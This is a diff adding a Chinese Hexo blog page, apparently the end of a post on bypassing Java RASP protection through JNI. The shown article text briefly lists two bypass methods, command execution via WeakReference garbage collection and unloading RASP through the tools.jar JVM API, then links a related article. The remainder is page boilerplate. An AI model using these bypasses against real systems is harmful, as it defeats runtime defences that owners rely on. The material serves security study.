+<li>弱引用 GC. 一种依托 WeakReference 弱引用的命令执行方式，有别于常规的命令执行，因此在某些场景下可以绕过。</li>
+<li>高权限场景卸载 RASP。通过获取 tools.jar 的路径，调用里面的 JVM API 来卸载 RASP</li>
+</ol>
+</blockquote>
+<p>‍</p>
+<p>这篇文章写的很详细：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园 (cnblogs.com)</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'ComjO6HnVsr1xOv8hNwQ8iXY-gzGzoHsz',
+        appKey: 'jUr4hlk8CSkRFFeoyiMvBesp',
+        serverURLs: 'https://comjo6hn.lc-cn-n1-shared.com',
+        notify: 'true' === 'true',
+        verify: 'true' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/11/23/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Java安全--JNI绕过RASP">
+                        
+                        <span class="card-title">Java安全--JNI绕过RASP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/" class="post-category">
+                                    未分类
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/11/21/Time/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Time">
+                        
+                        <span class="card-title">Time</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-11-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">清风</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">72.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1111" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1111" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    
+
+</body>
+
+</html>
